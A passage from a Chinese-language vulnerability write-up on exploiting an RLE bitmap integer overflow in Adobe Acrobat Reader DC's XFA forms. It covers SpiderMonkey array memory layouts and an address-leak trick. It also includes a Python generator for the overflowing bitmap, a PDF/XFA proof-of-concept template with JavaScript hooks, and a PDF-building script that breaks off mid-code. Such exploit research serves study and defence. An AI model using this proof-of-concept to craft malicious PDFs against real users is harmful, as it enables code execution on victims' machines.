时，其底层元素存储区所在的堆块将通过系统堆申请（<code>ucrtbase!calloc</code>）；当 <code>length</code> 的大小小于等于 <code>14</code> 时，堆块从 SpiderMonkey 的私有堆 <strong>nursery heap</strong> 申请。和 <code>ArrayBuffer</code> 一样，当底层元素存储区独立申请堆块时，需要额外申请 <code>0x10</code> 字节的空间用于存储 <code>ObjectElements</code> 对象。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ObjectElements</span> &#123;</span></span><br><span class="line"> <span class="keyword">public</span>:</span><br><span class="line">  <span class="comment">// The NumShiftedElementsBits high bits of this are used to store the</span></span><br><span class="line">  <span class="comment">// number of shifted elements, the other bits are available for the flags.</span></span><br><span class="line">  <span class="comment">// See Flags enum above.</span></span><br><span class="line">  <span class="keyword">uint32_t</span> flags;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">   * Number of initialized elements. This is &lt;= the capacity, and for arrays</span></span><br><span class="line"><span class="comment">   * is &lt;= the length. Memory for elements above the initialized length is</span></span><br><span class="line"><span class="comment">   * uninitialized, but values between the initialized length and the proper</span></span><br><span class="line"><span class="comment">   * length are conceptually holes.</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="keyword">uint32_t</span> initializedLength;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Number of allocated slots. */</span></span><br><span class="line">  <span class="keyword">uint32_t</span> capacity;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 'length' property of array objects, unused for other objects. */</span></span><br><span class="line">  <span class="keyword">uint32_t</span> length;</span><br><span class="line"> <span class="comment">// ......</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>在 Adobe Acrobat Reader DC 中执行下面的 JavaScript 代码：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> array = <span class="keyword">new</span> <span class="built_in">Array</span>(<span class="number">15</span>);</span><br><span class="line">array[<span class="number">0</span>] = array[array.length - <span class="number">1</span>] = <span class="number">0x41424344</span>;</span><br></pre></td></tr></table></figure><p><code>Array</code> 对象元素存储区的内存布局如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">0:010&gt; dd 34cb0f88-10 L90/4</span><br><span class="line">34cb0f78  00000000 0000000f 0000000f 0000000f</span><br><span class="line">34cb0f88  41424344 ffffff81 00000000 ffffff84 ; [0], [1]</span><br><span class="line">34cb0f98  00000000 ffffff84 00000000 ffffff84</span><br><span class="line">34cb0fa8  00000000 ffffff84 00000000 ffffff84</span><br><span class="line">34cb0fb8  00000000 ffffff84 00000000 ffffff84</span><br><span class="line">34cb0fc8  00000000 ffffff84 00000000 ffffff84</span><br><span class="line">34cb0fd8  00000000 ffffff84 00000000 ffffff84</span><br><span class="line">34cb0fe8  00000000 ffffff84 00000000 ffffff84</span><br><span class="line">34cb0ff8  41424344 ffffff81 ???????? ???????? ; [14]</span><br></pre></td></tr></table></figure><p>这里 <code>array[0]</code> 和 <code>array[14]</code> 的值都是 <code>41424344 ffffff81</code> ，其中标签 <code>0xFFFFFF81</code> 表示元素的类型为 <code>INT32</code> 。而 <code>array[1]</code> 到 <code>array[13]</code> 之间的所有元素都被填充为 <code>00000000 ffffff84</code> ，表示这些元素当前是未定义的（即 <code>undefined</code> ）。</p><p>对 <code>Array</code> 而言，如果可以通过触发漏洞更改 <code>capacity</code> 和 <code>length</code> 的值，那么就可以实现越界写操作：仅仅是越界写，因为 <code>initializedLength</code> 不变的话越界读取的元素全部为 <code>undefined</code> ，同时一旦进行越界写操作，<code>initializedLength</code> 之后到越界写之前的所有元素都会被填充为 <code>00000000 ffffff84</code> ，控制不好的话很容导致进程崩溃。</p><p>那么如果同时更改 <code>initializedLength</code> 呢？理论上问题不大，不过对于本文所讨论的漏洞而言不适用，因为 <code>initializedLength</code> 的值会被改成非常大的值（四字节全部为相同的数据），而在 GC 过程中数组的所有元素都会被扫描，进程会因为访问到不可访问的内存页而崩溃。</p><h4 id="5-2-3-JSObject"><a href="#5-2-3-JSObject" class="headerlink" title="5.2.3 JSObject"></a>5.2.3 JSObject</h4><p>在 SpiderMonkey 中，所有 JavaScript 对象的类都继承自 <code>JSObject</code> ，后者又继承自 <code>ObjectImpl</code> ，相关定义如下：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ObjectImpl</span> :</span> <span class="keyword">public</span> gc::Cell &#123;</span><br><span class="line">  <span class="keyword">protected</span>:</span><br><span class="line">    HeapPtrShape shape_;</span><br><span class="line">    HeapPtrTypeObject type_;</span><br><span class="line">    HeapSlot *slots;</span><br><span class="line">    HeapSlot *elements;</span><br><span class="line">  <span class="comment">// ......</span></span><br><span class="line">&#125;;</span><br><span class="line">    </span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">JSObject</span> :</span> <span class="keyword">public</span> js::ObjectImpl &#123;&#125;</span><br></pre></td></tr></table></figure><p>对某些对象（比如 <code>DataView</code> ）而言， <code>elements</code> 的值是没有意义的，因此会指向一个静态全局变量  <code>emptyElementsHeader</code> ，读取这些对象的 <code>elements</code> 的值可以用于泄露 JavaScript 引擎模块的基地址。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> ObjectElements <span class="title">emptyElementsHeader</span><span class="params">(<span class="number">0</span>, <span class="number">0</span>)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Objects with no elements share one empty set of elements. */</span></span><br><span class="line">HeapSlot *js::emptyObjectElements =</span><br><span class="line">    <span class="keyword">reinterpret_cast</span>&lt;HeapSlot *&gt;(<span class="keyword">uintptr_t</span>(&amp;emptyElementsHeader) + </span><br><span class="line">    <span class="keyword">sizeof</span>(ObjectElements));</span><br></pre></td></tr></table></figure><h3 id="5-3-位图构造"><a href="#5-3-位图构造" class="headerlink" title="5.3 位图构造"></a>5.3 位图构造</h3><p>如下 Python 代码可以用于创建 RLE 类型的位图文件（可以指定各种参数以及位图数据）：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment">#-*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line">RLE8 = <span class="number">1</span></span><br><span class="line">RLE4 = <span class="number">2</span></span><br><span class="line">COMPRESSION = RLE8</span><br><span class="line">BIT_COUNT = <span class="number">8</span></span><br><span class="line">CLR_USED = <span class="number">1</span> &lt;&lt; BIT_COUNT</span><br><span class="line">WIDTH = <span class="number">0xF0</span></span><br><span class="line">HEIGHT = <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_bitmap_file_header</span><span class="params">(file_size, bits_offset)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> struct.pack(<span class="string">'&lt;2sIHHI'</span>, <span class="string">'BM'</span>, file_size, <span class="number">0</span>, <span class="number">0</span>, bits_offset)</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_bitmap_info_header</span><span class="params">(data_size)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> struct.pack(<span class="string">'&lt;IIIHHIIIIII'</span>,</span><br><span class="line">        <span class="number">0x00000028</span>,</span><br><span class="line">        WIDTH,</span><br><span class="line">        HEIGHT,</span><br><span class="line">        <span class="number">0x0001</span>,</span><br><span class="line">        BIT_COUNT,</span><br><span class="line">        COMPRESSION,</span><br><span class="line">        data_size,</span><br><span class="line">        <span class="number">0x00000000</span>,</span><br><span class="line">        <span class="number">0x00000000</span>,</span><br><span class="line">        CLR_USED,</span><br><span class="line">        <span class="number">0x00000000</span>)</span><br><span class="line">        </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_bitmap_info_colors</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="comment"># B, G, R, Reserved</span></span><br><span class="line">    rgb_quad = <span class="string">'\x00\x00\xFF\x00'</span></span><br><span class="line">    <span class="keyword">return</span> rgb_quad * CLR_USED</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_bitmap_data</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="comment"># set ypos to 0 so that we'll be at the beginning of the heap buffer</span></span><br><span class="line">    <span class="comment"># ypos = (HEIGHT - 1) = 0, no need to bother</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># set xpos to 0xFFFFFF00</span></span><br><span class="line">    data = <span class="string">'\x00\x02\xFF\x00'</span> * (<span class="number">0xFFFFFF00</span> / <span class="number">0xFF</span>)</span><br><span class="line">    <span class="comment"># set xpos to 0xFFFFFF0C</span></span><br><span class="line">    data += <span class="string">'\x00\x02\x0C\x00'</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 0xFFFFFF0C + 0xF4 = 0</span></span><br><span class="line">    <span class="comment"># 0xF4 bytes of 0x10</span></span><br><span class="line">    data += <span class="string">'\xF4\x10'</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># mark end of bitmap to skip CxxThrowException</span></span><br><span class="line">    data += <span class="string">'\x00\x01'</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generate_bitmap</span><span class="params">(filepath)</span>:</span></span><br><span class="line">    data = get_bitmap_data()</span><br><span class="line">    data_size = len(data)</span><br><span class="line">    </span><br><span class="line">    bmi_header = get_bitmap_info_header(data_size)</span><br><span class="line">    bmi_colors = get_bitmap_info_colors()</span><br><span class="line">    </span><br><span class="line">    bmf_header_size = <span class="number">0x0E</span></span><br><span class="line">    bits_offset = bmf_header_size + len(bmi_header) + len(bmi_colors)</span><br><span class="line">    file_size = bits_offset + data_size</span><br><span class="line">    bmf_header = get_bitmap_file_header(file_size, bits_offset)</span><br><span class="line">    <span class="keyword">with</span> open(filepath, <span class="string">'wb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(bmf_header)</span><br><span class="line">        f.write(bmi_header)</span><br><span class="line">        f.write(bmi_colors)</span><br><span class="line">        f.write(data)</span><br><span class="line">        </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="keyword">if</span> len(sys.argv) != <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">'Usage: %s &lt;output.bmp&gt;'</span> % os.path.basename(sys.argv[<span class="number">0</span>])</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line">    generate_bitmap(sys.argv[<span class="number">1</span>])</span><br></pre></td></tr></table></figure><p>这里直接创建一个 RLE8 位图文件，相关参数如下：</p><ul><li>宽度为 <code>0xF0</code> </li><li>高度为 <code>1</code> </li><li>位数为 <code>8</code> </li></ul><p>对该位图而言，用于存储位图数据的堆块的大小将会是 <code>0xF0</code> ，而函数 <code>get_bitmap_data</code> 中指定的位图数据将使得我们可以向低地址方向越界写 <code>0xF4</code> 字节的数据，其中数据全部为 <code>0x10</code> 。</p><h3 id="5-4-PDF-构造"><a href="#5-4-PDF-构造" class="headerlink" title="5.4 PDF 构造"></a>5.4 PDF 构造</h3><p>下面是一个 PDF 模板文件的内容，该模板后续将用于生成 POC 文件。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br></pre></td><td class="code"><pre><span class="line">%PDF<span class="number">-1.7</span></span><br><span class="line"><span class="number">1</span> <span class="number">0</span> obj</span><br><span class="line">&lt;&lt;</span><br><span class="line">    /Type /Catalog</span><br><span class="line">    /AcroForm <span class="number">5</span> <span class="number">0</span> R</span><br><span class="line">    /Pages <span class="number">2</span> <span class="number">0</span> R</span><br><span class="line">    /NeedsRendering <span class="literal">true</span></span><br><span class="line">    /Extensions</span><br><span class="line">    &lt;&lt;</span><br><span class="line">        /ADBE</span><br><span class="line">        &lt;&lt;</span><br><span class="line">            /ExtensionLevel <span class="number">3</span></span><br><span class="line">            /BaseVersion /<span class="number">1.7</span></span><br><span class="line">        &gt;&gt;</span><br><span class="line">    &gt;&gt;</span><br><span class="line">&gt;&gt;</span><br><span class="line">endobj</span><br><span class="line"><span class="number">2</span> <span class="number">0</span> obj</span><br><span class="line">&lt;&lt;</span><br><span class="line">    /Type /Pages</span><br><span class="line">    /Kids [<span class="number">3</span> <span class="number">0</span> R]</span><br><span class="line">    /Count <span class="number">1</span></span><br><span class="line">&gt;&gt;</span><br><span class="line">endobj</span><br><span class="line"><span class="number">3</span> <span class="number">0</span> obj</span><br><span class="line">&lt;&lt;</span><br><span class="line">    /Type /Page</span><br><span class="line">    /Parent <span class="number">2</span> <span class="number">0</span> R</span><br><span class="line">    /Contents <span class="number">4</span> <span class="number">0</span> R</span><br><span class="line">    /Resources</span><br><span class="line">    &lt;&lt;</span><br><span class="line">        /Font</span><br><span class="line">        &lt;&lt;</span><br><span class="line">            /F1</span><br><span class="line">            &lt;&lt;</span><br><span class="line">                /BaseFont /Helvetica</span><br><span class="line">                /Subtype /Type1</span><br><span class="line">                /Name /F1</span><br><span class="line">            &gt;&gt;</span><br><span class="line">        &gt;&gt;</span><br><span class="line">    &gt;&gt;</span><br><span class="line">&gt;&gt;</span><br><span class="line">endobj</span><br><span class="line"><span class="number">4</span> <span class="number">0</span> obj</span><br><span class="line">&lt;&lt;</span><br><span class="line">    /Length <span class="number">104</span></span><br><span class="line">&gt;&gt;</span><br><span class="line">stream</span><br><span class="line">BT</span><br><span class="line">/F1 <span class="number">12</span> Tf</span><br><span class="line"><span class="number">90</span> <span class="number">692</span> Td</span><br><span class="line">(If you see <span class="keyword">this</span> page, it means that your PDF reader does not support XFA.) Tj</span><br><span class="line">ET</span><br><span class="line">endstream</span><br><span class="line">endobj</span><br><span class="line"><span class="number">5</span> <span class="number">0</span> obj</span><br><span class="line">&lt;&lt;</span><br><span class="line">    /XFA <span class="number">6</span> <span class="number">0</span> R</span><br><span class="line">&gt;&gt;</span><br><span class="line">endobj</span><br><span class="line"><span class="number">6</span> <span class="number">0</span> obj</span><br><span class="line">&lt;&lt;</span><br><span class="line">    /Filter /FlateDecode</span><br><span class="line">    /Length __STREAM_LENGTH__</span><br><span class="line">&gt;&gt;</span><br><span class="line">stream</span><br><span class="line">&lt;xdp:xdp xmlns:xdp=<span class="string">"http://ns.adobe.com/xdp/"</span>&gt;</span><br><span class="line">  &lt;template xmlns:xfa=<span class="string">"http://www.xfa.org/schema/xfa-template/3.1/"</span> xmlns=<span class="string">"http://www.xfa.org/schema/xfa-template/3.0/"</span>&gt;</span><br><span class="line">    &lt;subform name=<span class="string">"form1"</span> layout=<span class="string">"tb"</span> locale=<span class="string">"en_US"</span> restoreState=<span class="string">"auto"</span>&gt;</span><br><span class="line">      &lt;pageSet&gt;</span><br><span class="line">        &lt;pageArea name=<span class="string">"Page1"</span> id=<span class="string">"Page1"</span>&gt;</span><br><span class="line">          &lt;contentArea x=<span class="string">"0.25in"</span> y=<span class="string">"0.25in"</span> w=<span class="string">"576pt"</span> h=<span class="string">"756pt"</span>/&gt;</span><br><span class="line">          &lt;medium stock=<span class="string">"default"</span> short=<span class="string">"612pt"</span> long=<span class="string">"792pt"</span>/&gt;</span><br><span class="line">        &lt;<span class="regexp">/pageArea&gt;</span></span><br><span class="line"><span class="regexp">      &lt;/</span>pageSet&gt;</span><br><span class="line">      &lt;subform w=<span class="string">"576pt"</span> h=<span class="string">"756pt"</span>&gt;</span><br><span class="line">        &lt;field name=<span class="string">"ImageCrash"</span>&gt;</span><br><span class="line">          &lt;ui&gt;</span><br><span class="line">            &lt;imageEdit/&gt;</span><br><span class="line">          &lt;<span class="regexp">/ui&gt;</span></span><br><span class="line"><span class="regexp">          &lt;value&gt;</span></span><br><span class="line"><span class="regexp">            &lt;image aspect="actual" contentType="image/</span>bmp<span class="string">"&gt;</span></span><br><span class="line"><span class="string">__IMAGE_BASE64_DATA__</span></span><br><span class="line"><span class="string">            &lt;/image&gt;</span></span><br><span class="line"><span class="string">          &lt;/value&gt;</span></span><br><span class="line"><span class="string">        &lt;/field&gt;</span></span><br><span class="line"><span class="string">      &lt;/subform&gt;</span></span><br><span class="line"><span class="string">      &lt;event activity="</span>initialize<span class="string">" name="</span>event__initialize<span class="string">"&gt;</span></span><br><span class="line"><span class="string">        &lt;script contentType="</span>application/x-javascript<span class="string">"&gt;</span></span><br><span class="line"><span class="string">// The JavaScript code will be executed before triggering the vulnerability</span></span><br><span class="line"><span class="string">        &lt;/script&gt;</span></span><br><span class="line"><span class="string">      &lt;/event&gt;</span></span><br><span class="line"><span class="string">      &lt;event activity="</span>docReady<span class="string">" ref="</span>$host<span class="string">" name="</span>event__docReady<span class="string">"&gt;</span></span><br><span class="line"><span class="string">        &lt;script contentType="</span>application/x-javascript<span class="string">"&gt;</span></span><br><span class="line"><span class="string">// The JavaScript code will be executed after triggering the vulnerability</span></span><br><span class="line"><span class="string">        &lt;/script&gt;</span></span><br><span class="line"><span class="string">      &lt;/event&gt;</span></span><br><span class="line"><span class="string">    &lt;/subform&gt;</span></span><br><span class="line"><span class="string">  &lt;/template&gt;</span></span><br><span class="line"><span class="string">  &lt;config xmlns="</span>http:<span class="comment">//www.xfa.org/schema/xci/3.0/"&gt;</span></span><br><span class="line">    &lt;agent name=<span class="string">"designer"</span>&gt;</span><br><span class="line">      &lt;!--  [<span class="number">0.</span>.n]  --&gt;</span><br><span class="line">      &lt;destination&gt;pdf&lt;<span class="regexp">/destination&gt;</span></span><br><span class="line"><span class="regexp">      &lt;pdf&gt;</span></span><br><span class="line"><span class="regexp">        &lt;!--  [0..n]  --&gt;</span></span><br><span class="line"><span class="regexp">        &lt;fontInfo/</span>&gt;</span><br><span class="line">      &lt;<span class="regexp">/pdf&gt;</span></span><br><span class="line"><span class="regexp">    &lt;/</span>agent&gt;</span><br><span class="line">    &lt;present&gt;</span><br><span class="line">      &lt;!--  [<span class="number">0.</span>.n]  --&gt;</span><br><span class="line">      &lt;pdf&gt;</span><br><span class="line">        &lt;!--  [<span class="number">0.</span>.n]  --&gt;</span><br><span class="line">        &lt;version&gt;<span class="number">1.7</span>&lt;<span class="regexp">/version&gt;</span></span><br><span class="line"><span class="regexp">        &lt;adobeExtensionLevel&gt;5&lt;/</span>adobeExtensionLevel&gt;</span><br><span class="line">      &lt;<span class="regexp">/pdf&gt;</span></span><br><span class="line"><span class="regexp">      &lt;common/</span>&gt;</span><br><span class="line">      &lt;xdp&gt;</span><br><span class="line">        &lt;packets&gt;*<span class="xml"><span class="tag">&lt;/<span class="name">packets</span>&gt;</span></span></span><br><span class="line">      &lt;<span class="regexp">/xdp&gt;</span></span><br><span class="line"><span class="regexp">    &lt;/</span>present&gt;</span><br><span class="line">  &lt;<span class="regexp">/config&gt;</span></span><br><span class="line"><span class="regexp">  &lt;xfa:datasets xmlns:xfa="http:/</span><span class="regexp">/www.xfa.org/</span>schema/xfa-data/<span class="number">1.0</span>/<span class="string">"&gt;</span></span><br><span class="line"><span class="string">    &lt;xfa:data xfa:dataNode="</span>dataGroup<span class="string">"/&gt;</span></span><br><span class="line"><span class="string">  &lt;/xfa:datasets&gt;</span></span><br><span class="line"><span class="string">  &lt;xfdf xmlns="</span>http:<span class="comment">//ns.adobe.com/xfdf/" xml:space="preserve"&gt;</span></span><br><span class="line">    &lt;annots/&gt;</span><br><span class="line">  &lt;<span class="regexp">/xfdf&gt;</span></span><br><span class="line"><span class="regexp">&lt;/</span>xdp:xdp&gt;</span><br><span class="line">endstream</span><br><span class="line">endobj</span><br><span class="line">xref</span><br><span class="line"><span class="number">0</span> <span class="number">7</span></span><br><span class="line"><span class="number">0000000000</span> <span class="number">65535</span> f </span><br><span class="line"><span class="number">0000000009</span> <span class="number">00000</span> n </span><br><span class="line"><span class="number">0000000237</span> <span class="number">00000</span> n </span><br><span class="line"><span class="number">0000000306</span> <span class="number">00000</span> n </span><br><span class="line"><span class="number">0000000587</span> <span class="number">00000</span> n </span><br><span class="line"><span class="number">0000000746</span> <span class="number">00000</span> n </span><br><span class="line"><span class="number">0000000782</span> <span class="number">00000</span> n </span><br><span class="line">trailer</span><br><span class="line">&lt;&lt;</span><br><span class="line">    /Root <span class="number">1</span> <span class="number">0</span> R</span><br><span class="line">    /Size <span class="number">7</span></span><br><span class="line">&gt;&gt;</span><br><span class="line">startxref</span><br><span class="line">__XREF_OFFSET__</span><br><span class="line">%%EOF</span><br></pre></td></tr></table></figure><p>为了触发整数溢出，前面构造的位图文件的大小将超过 <code>60MB</code> ，而且在嵌入 XFA 表单时，需要对其进行 Base64 编码，这会使得生成的 PDF 文件相当大。为了压缩 PDF 文件的大小，可以给对象 <code>6 0 obj</code> 指定一个 <code>Filter</code> （这里为 <code>FlateDecode</code> ）以便压缩对象的数据，因为数据比较规律，所以压缩率还是相当可观的。</p><p>为了实现漏洞利用，需要在触发漏洞前完成内存布局、在触发漏洞后完成后续利用步骤，而这些操作都需要借助执行 JavaScript 代码来完成，因此需要在不同的时间点执行不同的 JavaScript 代码，这可以通过给 <code>subform</code> 的 <code>initialize</code> 事件和 <code>docReady</code> 事件设置事件处理代码来完成。</p><p>下面的 Python 代码可以用于生成 PDF 文件：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment">#-*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> zlib</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">parse_template</span><span class="params">(template_path)</span>:</span></span><br><span class="line">    <span class="keyword">with</span> open(template_path, <span class="string">'rb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">        data = f.read()</span><br><span class="line">    xdp_begin = data.find(<span class="string">'&lt;xdp:xdp'</span>)</span><br><span class="line">    xdp_end = data.find(<span class="string">'&lt;/xdp:xdp&gt;'</span>) + len(<span class="string">'&lt;/xdp:xdp&gt;'</span>)</span><br><span class="line">    </span><br><span class="line">    part1 = data[:xdp_begin]</span><br><span class="line">    part2 = data[xdp_begin:xdp_end]</span><br><span class="line">    part3 = data[xdp_end:]</span><br><span class="line">    <span class="keyword">return</span> part1, part2, part3</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generate_pdf</span><span class="params">(image_path, template_path, pdf_path)</span>:</span></span><br><span class="line">    pdf_part1, pdf_part2, 